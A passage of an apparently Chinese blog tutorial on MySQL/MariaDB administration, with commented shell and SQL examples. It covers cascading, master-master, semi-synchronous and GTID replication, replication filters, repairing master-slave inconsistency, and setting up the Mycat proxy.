class="hljs-comment">#在中间级联slave实现</span><br>[root@centos8 ~]<span class="hljs-comment">#vim /etc/my.cnf.d/mariadb-server.cnf</span><br>[mysqld]<br>server-id=18<br>log-bin<br>read-only<br>log_slave_updates  <span class="hljs-comment">#级联复制中间节点的必选项,MySQL8.0此为默认值,可以不要人为添加</span><br>[root@centos8 ~]<span class="hljs-comment">#systemctl restart mariadb</span><br><span class="hljs-comment">#还原数据库</span><br>[root@centos8 ~]<span class="hljs-comment">#vim /data/all.sql</span><br>CHANGE MASTER TO<br>  MASTER_HOST=<span class="hljs-string">&#x27;master节点的iP&#x27;</span>,<br>  MASTER_USER=<span class="hljs-string">&#x27;repluser&#x27;</span>,<br>  MASTER_PASSWORD=<span class="hljs-string">&#x27;centos&#x27;</span>,<br>  MASTER_PORT=3306,<br>  MASTER_LOG_FILE=<span class="hljs-string">&#x27;mysql-bin.000004&#x27;</span>,<br>  MASTER_LOG_POS=523;<br>  <br>[root@centos8 ~]<span class="hljs-comment">#mysql </span><br>MariaDB [(none)]&gt; <span class="hljs-built_in">set</span> sql_log_bin=0;<br>MariaDB [(none)]&gt; <span class="hljs-built_in">source</span> /data/all.sql<br>MariaDB [(none)]&gt; show master logs;  <span class="hljs-comment">#记录二进制位置，给第三个节点使用  </span><br>MariaDB [(none)]&gt; <span class="hljs-built_in">set</span> sql_log_bin=0;<br>MariaDB [(none)]&gt; start slave;<br><br><span class="hljs-comment">#在第三个节点slave上实现</span><br>[root@centos8 ~]<span class="hljs-comment">#vim /etc/my.cnf.d/mariadb-server.cnf</span><br>[mysqld]<br>server-id=28<br>read-only<br>[root@centos8 ~]<span class="hljs-comment">#systemctl restart mariadb</span><br>[root@centos8 ~]<span class="hljs-comment">#vim /data/all.sql </span><br>CHANGE MASTER TO<br>MASTER_HOST=<span class="hljs-string">&#x27;中间节点的IP&#x27;</span>,<br>MASTER_USER=<span class="hljs-string">&#x27;repluser&#x27;</span>,<br>MASTER_PASSWORD=<span class="hljs-string">&#x27;123456&#x27;</span>,<br>MASTER_PORT=3306,<br>MASTER_LOG_FILE=<span class="hljs-string">&#x27;mariadb-bin.000002&#x27;</span>, MASTER_LOG_POS=344; <br>[root@centos8 ~]<span class="hljs-comment">#mysql &lt; /data/all.sql</span><br>[root@centos8 ~]<span class="hljs-comment">#mysql -e &#x27;start slave;&#x27;</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="1-5-主主复制"><a href="#1-5-主主复制" class="headerlink" title="1.5 主主复制"></a>1.5 主主复制</h3><blockquote><p>主主复制：两个节点，都可以更新数据，并且互为主从</p><p>容易产生的问题：数据不一致；因此慎用</p><p>考虑要点：自动增长id</p><p><strong>配置一个节点使用奇数id</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">auto_increment_offset=1   <span class="hljs-comment">#开始点</span><br>auto_increment_increment=2 <span class="hljs-comment">#增长幅度</span><br></code></pre></td></tr></table></figure><p><strong>另一个节点使用偶数id</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">auto_increment_offset=2<br>auto_increment_increment=2<br></code></pre></td></tr></table></figure><p><strong>主主复制的配置步骤：</strong></p><ul><li>(1) 各节点使用一个惟一server_id</li><li>(2) 都启动binary log和relay log</li><li>(3) 创建拥有复制权限的用户账号</li><li>(4) 定义自动增长id字段的数值范围各为奇偶</li><li>(5) 均把对方指定为主节点，并启动复制线程</li></ul></blockquote><h3 id="1-6-半同步复制"><a href="#1-6-半同步复制" class="headerlink" title="1.6 半同步复制"></a>1.6 半同步复制</h3><blockquote><ul><li><strong>默认情况下，MySQL的复制功能是异步的，异步复制可以提供最佳的性能，主库把binlog日志发送给从库即结束，并不验证从库是否接收完毕。这意味着当主服务器或从服务器端发生故障时，有可能从服务器没有接收到主服务器发送过来的binlog日志，这就会造成主服务器和从服务器的数据不一致，甚至在恢复时造成数据的丢失</strong></li><li>MySQL5.5版本为了保证主从数据的一致性问题。加入了<strong>半同步复制的组件(插件)</strong>,可以控制从库IO线程是否将relaylog落盘，一旦落盘通过插件返回ACK给主库ACK_REC。接受到ACK之后，主库的事务才能提交成功。在默认情况下，如果<strong>超过10秒没有返回ACK，此次复制行为会切换为异步复制</strong></li><li>在MySQL5.6,5.7 当中也加入了一些比较好的特性，也不能完全保证的数据一致。如果生产业务比较关注主从最终一致(比如:金融等)。推荐可以使用MGR的架构，或者PXC等一致性架构</li></ul></blockquote><blockquote><p><strong>半同步复制默认设置</strong></p><ul><li>缺点1： 幻读</li></ul><p>     当用户提交一个事务，该事务已经写入redo日志和binlog日志，但该事务还没写入从库，</p><p>     此时处在waiting slave dump处，此时另一个用户可以读取到这条数据，而他自己却不能；</p><ul><li>缺点2：数据丢失</li></ul><p>     一个提交的事务在waiting slave dump处crash后，主库将比从库多一条数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpl_semi_sync_master_wait_point=after_commit<br></code></pre></td></tr></table></figure><p><strong>增强半同步复制(MySQL5.7新增功能)</strong></p><ul><li>改善1：解决幻读</li></ul><p>     当用户发起一个事务，该事务先写入二进制后，再向从库进行同步，由于还没有完成提交，</p><p>     此时其他用户无法读取到该数据，解决了幻读</p><ul><li>改善2：解决数据丢失</li></ul><p>     一个事务在waiting slave dump处crash掉后，可以通过观察从库上是否存在主库的last gtid值，</p><p>     如果存在，这条数据正常恢复，如果不存在则删除主库的那条多余的GTID值，然后恢复，保证了数据的完整性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpl_semi_rsync_master_wait_point=after_sync<br></code></pre></td></tr></table></figure></blockquote><h4 id="范例：MySQL8-0-实现半同步复制"><a href="#范例：MySQL8-0-实现半同步复制" class="headerlink" title="范例：MySQL8.0 实现半同步复制"></a>范例：MySQL8.0 实现半同步复制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#前提：已完成主从（默认的异步复制）</span><br><span class="hljs-comment">#查看插件文件</span><br>[root@rocky01 ~]<span class="hljs-comment"># rpm -ql mysql-server |grep semisync</span><br>/usr/lib64/mysql/plugin/semisync_master.so<br>/usr/lib64/mysql/plugin/semisync_slave.so<br><br><span class="hljs-comment">#master服务器10.0.0.8配置</span><br>[root@master ~]<span class="hljs-comment"># mysql</span><br>mysql&gt; INSTALL PLUGIN rpl_semi_sync_master SONAME <span class="hljs-string">&#x27;semisync_master.so&#x27;</span>; <span class="hljs-comment">#永久安装插件</span><br>mysql&gt; SHOW PLUGINS; <span class="hljs-comment">#查看插件</span><br>[root@master ~]<span class="hljs-comment"># vim /etc/my.cnf</span><br>[mysqld]<br>server-id=8<br>log_bin=/data/logbin/mysql-bin<br>rpl_semi_sync_master_enabled=ON    <span class="hljs-comment">#修改此行,需要先安装semisync_master.so插件后,再重启,否则无法启动</span><br>rpl_semi_sync_master_timeout=3000  <span class="hljs-comment">#设置3s内无法同步（默认10s），也将返回成功信息给客户端</span><br>[root@master ~]<span class="hljs-comment"># systemctl restart mysqld</span><br><br><span class="hljs-comment">#slave1服务器10.0.0.18配置</span><br>[root@slave1 ~]<span class="hljs-comment"># mysql</span><br>mysql&gt; INSTALL PLUGIN rpl_semi_sync_slave SONAME <span class="hljs-string">&#x27;semisync_slave.so&#x27;</span>;<span class="hljs-comment">#永久安装插件</span><br>[root@slave1 ~]<span class="hljs-comment">#vim /etc/my.cnf</span><br>[mysqld]<br>server-id=18<br>read-only<br>rpl_semi_sync_slave_enabled=ON    <span class="hljs-comment">#修改此行,需要先安装semisync_slave.so插件后,再重启,否则无法启动</span><br>[root@slave1 ~]<span class="hljs-comment"># systemctl restart mysqld</span><br><br><span class="hljs-comment">#slave2服务器10.0.0.28配置</span><br>[root@slave2 ~]<span class="hljs-comment"># mysql</span><br>mysql&gt; INSTALL PLUGIN rpl_semi_sync_slave SONAME <span class="hljs-string">&#x27;semisync_slave.so&#x27;</span>;<span class="hljs-comment">#永久安装插件</span><br>[root@slave2 ~]<span class="hljs-comment">#vim /etc/my.cnf</span><br>[mysqld]<br>server-id=28<br>read-only<br>rpl_semi_sync_slave_enabled=ON    <span class="hljs-comment">#修改此行,需要先安装semisync_slave.so插件后,再重启,否则无法启动</span><br>[root@slave2 ~]<span class="hljs-comment"># systemctl restart mysqld</span><br><br><span class="hljs-comment">#以上步骤已完成半同步复制！</span><br><span class="hljs-comment">#主服务器相关命令:</span><br>mysql&gt;UNINSTALL PLUGIN rpl_semi_sync_master ; <span class="hljs-comment">#卸载插件</span><br>mysql&gt;SHOW PLUGINS; <span class="hljs-comment">#查看插件</span><br>mysql&gt;SET GLOBAL rpl_semi_sync_master_enabled=1; <span class="hljs-comment">#临时修改变量</span><br>mysql&gt;SET GLOBAL rpl_semi_sync_master_timeout = 3000;  <span class="hljs-comment">#临时超时长1s,默认值为10s</span><br><br>mysql&gt;SHOW GLOBAL VARIABLES LIKE <span class="hljs-string">&#x27;%semi%&#x27;</span>;<br>+-------------------------------------------+------------+<br>| Variable_name                             | Value      |<br>+-------------------------------------------+------------+<br>| rpl_semi_sync_master_enabled              | ON         |<br>| rpl_semi_sync_master_timeout              | 3000       |<br>| rpl_semi_sync_master_trace_level          | 32         |<br>| rpl_semi_sync_master_wait_for_slave_count | 1          |<br>| rpl_semi_sync_master_wait_no_slave        | ON         |<br>| rpl_semi_sync_master_wait_point           | AFTER_SYNC |<br>+-------------------------------------------+------------+<br>6 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; SHOW GLOBAL STATUS LIKE <span class="hljs-string">&#x27;%semi%&#x27;</span>;<br>+--------------------------------------------+-------+<br>| Variable_name                              | Value |<br>+--------------------------------------------+-------+<br>| Rpl_semi_sync_master_clients               | 2     |<br>| Rpl_semi_sync_master_net_avg_wait_time     | 0     |<br>| Rpl_semi_sync_master_net_wait_time         | 0     |<br>| Rpl_semi_sync_master_net_waits             | 4     |<br>| Rpl_semi_sync_master_no_times              | 1     |<br>| Rpl_semi_sync_master_no_tx                 | 1     |<br>| Rpl_semi_sync_master_status                | ON    |<br>| Rpl_semi_sync_master_timefunc_failures     | 0     |<br>| Rpl_semi_sync_master_tx_avg_wait_time      | 669   |<br>| Rpl_semi_sync_master_tx_wait_time          | 1339  |<br>| Rpl_semi_sync_master_tx_waits              | 2     |<br>| Rpl_semi_sync_master_wait_pos_backtraverse | 0     |<br>| Rpl_semi_sync_master_wait_sessions         | 0     |<br>| Rpl_semi_sync_master_yes_tx                | 2     |<br>+--------------------------------------------+-------+<br>14 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#从服务器相关命令:</span><br>mysql&gt;SET GLOBAL rpl_semi_sync_slave_enabled=1; <span class="hljs-comment">#临时修改变量</span><br><br>mysql&gt; SHOW GLOBAL VARIABLES LIKE <span class="hljs-string">&#x27;%semi%&#x27;</span>;<br>+---------------------------------+-------+<br>| Variable_name                   | Value |<br>+---------------------------------+-------+<br>| rpl_semi_sync_slave_enabled     | ON    |<br>| rpl_semi_sync_slave_trace_level | 32    |<br>+---------------------------------+-------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><br><span class="hljs-comment">#注意:如果已经实现主从复制,需要stop slave;start slave;</span><br>mysql&gt; stop slave;<br>mysql&gt; start slave;<br>mysql&gt; SHOW GLOBAL STATUS LIKE <span class="hljs-string">&#x27;%semi%&#x27;</span>;<br>+----------------------------+-------+<br>| Variable_name              | Value |<br>+----------------------------+-------+<br>| Rpl_semi_sync_slave_status | ON    |<br>+----------------------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="1-7-复制过滤器"><a href="#1-7-复制过滤器" class="headerlink" title="1.7 复制过滤器"></a>1.7 复制过滤器</h3><blockquote><p>让从节点仅复制指定的数据库，或指定数据库的指定表</p><p><strong>复制过滤器两种实现方式：</strong></p><p>(1) 服务器选项：主服务器仅向二进制日志中记录与特定数据库相关的事件</p><ul><li>缺点：基于二进制还原将无法实现；不建议使用</li><li>优点: 只需要在主节点配置一次即可</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/my.cnf<br>binlog-do-db=db1 <span class="hljs-comment">#数据库白名单列表，不支持同时指定多个值，如果想实现多个数据库需多行实现</span><br>binlog-do-db=db2 <br>binlog-ignore-db= <span class="hljs-comment">#数据库黑名单列表</span><br></code></pre></td></tr></table></figure><p>(2) 从服务器SQL_THREAD在relay log中的事件时，仅读取与特定数据库(特定表)相关的事件并应用于本地</p><ul><li>缺点：会造成网络及磁盘IO浪费,在所有从节点都要配置</li><li>优点: 不影响二进制备份还原</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#从服务器 上的复制过滤器相关变量</span><br>replicate_do_db=<span class="hljs-string">&quot;db1,db2,db3&quot;</span> <span class="hljs-comment">#指定复制库的白名单，变量可以指定逗号分隔的多个值，选项不支持多值,只能分别写多行实现</span><br>replicate_ignore_db= <span class="hljs-comment">#指定复制库黑名单</span><br>replicate_do_table= <span class="hljs-comment">#指定复制表的白名单</span><br>replicate_ignore_table= <span class="hljs-comment">#指定复制表的黑名单</span><br>replicate_wild_do_table= foo%.bar%  <span class="hljs-comment">#支持通配符</span><br>replicate_wild_ignore_table=<br></code></pre></td></tr></table></figure></blockquote><h3 id="1-8-GTID复制"><a href="#1-8-GTID复制" class="headerlink" title="1.8 GTID复制"></a>1.8 GTID复制</h3><blockquote><p><strong>GTID</strong> <strong>优点</strong><strong>:</strong></p><ul><li><p>保证事务全局统一</p></li><li><p>截取日志更加方便。跨多文件，判断起点终点更加方便</p></li><li><p>判断主从工作状态更加方便</p></li><li><p>传输日志，<strong>可以并发传输</strong>。SQL回放可以更高并发</p></li><li><p>主从复制构建更加方便</p></li><li><p>GTID = server_uuid:transaction_id，在一组复制中，全局唯一</p></li><li><p>server_uuid 来源于 /var/lib/mysql/auto.cnf</p></li></ul></blockquote><h4 id="1-8-1-GTID服务器相关选项"><a href="#1-8-1-GTID服务器相关选项" class="headerlink" title="1.8.1 GTID服务器相关选项"></a>1.8.1 GTID服务器相关选项</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gtid_mode <span class="hljs-comment">#gtid模式</span><br>enforce_gtid_consistency <span class="hljs-comment">#保证GTID安全的参数</span><br></code></pre></td></tr></table></figure><h4 id="1-8-2-GTID配置范例"><a href="#1-8-2-GTID配置范例" class="headerlink" title="1.8.2 GTID配置范例"></a>1.8.2 GTID配置范例</h4><h5 id="（1）主服务器"><a href="#（1）主服务器" class="headerlink" title="（1）主服务器"></a>（1）主服务器</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/my.cnf<br>server-id=8<br>gtid_mode=ON<br>enforce_gtid_consistency<br>log-bin=mysql-bin<br><br>systemctl restart mysqld<br>mysql&gt; grant replication slave on *.* to <span class="hljs-string">&#x27;repluser&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure><h5 id="（2）从服务器"><a href="#（2）从服务器" class="headerlink" title="（2）从服务器"></a>（2）从服务器</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/my.cnf<br>server-id=18<br>gtid_mode=ON<br>enforce_gtid_consistency<br><br>systemctl restart mysqld<br><br><span class="hljs-comment">#如果主服务器和从服务器数据不一致,需要先将主库数据备份还原至从库,再执行下面操作</span><br>mysqldump -A --master-data=2 &gt; /backup/full.sql<br>mysql&gt;CHANGE MASTER TO MASTER_HOST=<span class="hljs-string">&#x27;10.0.0.8&#x27;</span>,<br> MASTER_USER=<span class="hljs-string">&#x27;repluser&#x27;</span>,<br> MASTER_PASSWORD=<span class="hljs-string">&#x27;123456&#x27;</span>,<br> MASTER_PORT=3306,<br> MASTER_AUTO_POSITION=1;  <span class="hljs-comment">#使用GTID</span><br> <br> mysql&gt;start slave;<br><span class="hljs-comment">#注意观察:Retrieved_Gtid_set和Executed_Gtid_Set这两个值,</span><br><span class="hljs-comment">#对比主节点执行show master status的值,如果相同表示同步完成</span><br></code></pre></td></tr></table></figure><h3 id="1-9-MySQL-主从数据不一致（面试重点）"><a href="#1-9-MySQL-主从数据不一致（面试重点）" class="headerlink" title="1.9 MySQL 主从数据不一致（面试重点）"></a>1.9 MySQL 主从数据不一致（面试重点）</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><blockquote><ul><li><strong>主库binlog格式为Statement，同步到从库执行后可能造成主从不一致。</strong></li><li><strong>主库执行更改前有执行set sql_log_bin=0，会使主库不记录binlog，从库也无法变更这部分数据。</strong></li><li><strong>从节点未设置只读，误操作写入数据</strong></li><li><strong>主库或从库意外宕机，宕机可能会造成binlog或者relaylog文件出现损坏，导致主从不一致</strong></li><li><strong>主从实例版本不一致，特别是高版本是主，低版本为从的情况下，主数据库上面支持的功能，从数据库上面可能不支持该功能</strong></li><li><strong>主从sql_mode 不一致</strong></li><li><strong>MySQL自身bug导致</strong></li></ul></blockquote><h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><blockquote><ul><li>将从库重新实现</li></ul><p>虽然这也是一种解决方法，但是这个方案恢复时间比较慢，而且有时候从库也是承担一部分的查询操作的，不能贸然重建。</p><ul><li>使用percona-toolkit工具辅助</li></ul><p>PT工具包中包含pt-table-checksum和pt-table-sync两个工具，主要用于检测主从是否一致以及修复数据不一致情况。这种方案优点是修复速度快，不需要停止主从辅助，缺点是需要知识积累，需要时间去学习，去测试，特别是在生产环境，还是要小心使用</p><ul><li>手动重建不一致的表</li></ul><p>在从库发现某几张表与主库数据不一致，而这几张表数据量也比较大，手工比对数据不现实，并且重做整个库也比较慢，这个时候可以只重做这几张表来修复主从不一致这种方案缺点是在执行导入期间需要暂时停止从库复制，不过也是可以接受的</p><p><strong>范例：A,B,C这三张表主从数据不一致</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1、从库停止Slave复制</span><br>mysql&gt;stop slave;<br><br><span class="hljs-comment">#2、在主库上dump这三张表，并记录下同步的binlog和POS点</span><br>mysqldump -uroot -p123456 -q --single-transaction --master-data=2 testdb A B C &gt;/backup/A_B_C.sql<br><br><span class="hljs-comment">#3、查看A_B_C.sql文件，找出记录的binlog和POS点</span><br><span class="hljs-built_in">head</span> A_B_C.sql<br><span class="hljs-comment">#例如:MASTERLOGFILE=&#x27;mysql-bin.000002&#x27;, MASTERLOGPOS=123;</span><br><br><span class="hljs-comment">#以下指令是为了保障其他表的数据不丢失，一直同步直到那个点结束，</span><br><span class="hljs-comment">#A,B,C表的数据在之前的备份已经生成了一份快照，只需要导入进入，然后开启同步即可</span><br><span class="hljs-comment">#4、把A_B_C.sql拷贝到Slave机器上，并做指向新位置</span><br>mysql&gt;start slave until MASTERLOGFILE=<span class="hljs-string">&#x27;mysql-bin.000002&#x27;</span>, MASTERLOGPOS=123;<br><br><span class="hljs-comment">#5、在Slave机器上导入A_B_C.sql</span><br>mysql -uroot -p123456 testdb <br>mysql&gt;<span class="hljs-built_in">set</span> sql_log_bin=0;<br>mysql&gt;<span class="hljs-built_in">source</span> /backup/A_B_C.sql<br>mysql&gt;<span class="hljs-built_in">set</span> sql_log_bin=1;<br><br><span class="hljs-comment">#6、导入完毕后，从库开启同步即可。</span><br>mysql&gt;start slave;<br></code></pre></td></tr></table></figure></blockquote><h4 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h4><blockquote><ul><li><strong>主库binlog采用ROW格式</strong></li><li><strong>主从实例数据库版本保持一致</strong></li><li><strong>主库做好账号权限把控，不可以执行set sql_log_bin=0</strong></li><li><strong>从库开启只读，不允许人为写入</strong></li><li><strong>定期进行主从一致性检验</strong></li></ul></blockquote><h2 id="2-MySQL-中间件代理服务器"><a href="#2-MySQL-中间件代理服务器" class="headerlink" title="2 MySQL 中间件代理服务器"></a>2 MySQL 中间件代理服务器</h2><p><a href="https://img2022.cnblogs.com/blog/2927659/202211/2927659-20221102173735932-1137784711.png"><img src="2927659-20221102173735932-1137784711.png" alt="img"></a></p><h3 id="2-1-Mycat"><a href="#2-1-Mycat" class="headerlink" title="2.1 Mycat"></a>2.1 Mycat</h3><blockquote><p><strong>基于心跳的自动故障切换，支持读写分离，支持MySQL主从，以及galera cluster集群</strong></p><p><strong>配置文件：</strong></p><ul><li>server.xml Mycat软件本身相关的配置文件，设置账号、参数等</li><li>schema.xml Mycat对应的物理数据库和数据库表的配置,读写分离、高可用、分布式策略定制、节点控制</li></ul></blockquote><h4 id="2-1-1-Mycat-安装"><a href="#2-1-1-Mycat-安装" class="headerlink" title="2.1.1 Mycat 安装"></a>2.1.1 Mycat 安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#注：以下操作未实现读写分离</span><br><span class="hljs-comment">#1.下载安装JDK</span><br>yum -y install java<br><span class="hljs-comment">#确认安装成功</span><br>java -version<br><br><span class="hljs-comment">#2.下载安装mycat</span><br>wget http://dl.mycat.org.cn/1.6.7.4/Mycat-server-1.6.7.4-release/Mycat-server-1.6.7.4-release-20200105164103-linux.tar.gz<br><span class="hljs-built_in">mkdir</span> /apps<br>tar xvf Mycat-server-1.6.7.4-release-20200105164103-linux.tar.gz -C /apps<br><br><span class="hljs-comment">#3.配置环境变量</span><br>vim /etc/profile.d/mycat.sh<br>PATH=/apps/mycat/bin:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">source</span> /etc/profile.d/mycat.sh<br><br><span class="hljs-comment">#4.启动并查看日志，确定成功</span><br>mycat start<br><span class="hljs-built_in">cat</span> /app/mycat/logs/wrapper.log <br>...省略...<br>INFO   | jvm 1   | 2019/11/01 21:41:02 | MyCAT Server startup successfully. see logs <span class="hljs-keyword">in</span> logs/mycat.log<br><br><span class="hljs-comment">#5.连接mycat：</span><br>mysql -uroot -p123456 -h 127.0.0.1 -P8066<br></code></pre></td></tr></table></figure><h4 id="实战案例：Mycat-实现读写分离"><a href="#实战案例：Mycat-实现读写分离" class="headerlink" title="实战案例：Mycat 实现读写分离"></a>实战案例：Mycat 实现读写分离</h4><blockquote><p><strong>服务器共三台</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mycat 10.0.0.88 <span class="hljs-comment">#内存建议2G以上</span><br>master 10.0.0.8 MySQL 8.0 或者Mariadb 10.3.17<br>slave  10.0.0.18 MySQL 8.0 或者Mariadb 10.3.17<br></code></pre></td></tr></table></figure><p><strong>关闭<strong><strong>SELinux</strong></strong>和防火墙</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl stop firewalld<br>setenforce 0<br>时间同步<br></code></pre></td></tr></table></figure></blockquote><p><strong>（1）创建 MySQL 主从数据库</strong></p><p><strong>（2）<strong><strong>安装</strong></strong>mycat****并启动</strong></p><p><strong>（3）****mycat</strong> <strong>服务器上修改<strong><strong>server.xml</strong></strong>文件配置<strong><strong>Mycat</strong></strong>的连接信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@mycat ~]<span class="hljs-comment"># vim /apps/mycat/conf/server.xml</span><br>...省略...<br><span class="hljs-comment">#修改下面行的8066改为3306复制到到独立非注释行</span><br>&lt;property name=<span class="hljs-string">&quot;serverPort&quot;</span>&gt;3306&lt;/property&gt;<br>&lt;property name=<span class="hljs-string">&quot;handlelDistributedTransactions&quot;</span>&gt;0&lt;/property&gt; <span class="hljs-comment">#将上面行放在此行前面</span><br><br><span class="hljs-comment">#或者删除注释,并修改下面行的8066改为3306</span><br>&lt;property name=<span class="hljs-string">&quot;serverPort&quot;</span>&gt;3306&lt;/property&gt;<br>&lt;property name=<span class="hljs-string">&quot;managerPort&quot;</span>&gt;9066&lt;/property&gt;<br>&lt;property name=<span class="hljs-string">&quot;idleTimeout&quot;</span>&gt;300000&lt;/property&gt;<br>&lt;property name=<span class="hljs-string">&quot;authTimeout&quot;</span>&gt;15000&lt;/property&gt;<br>&lt;property name=<span 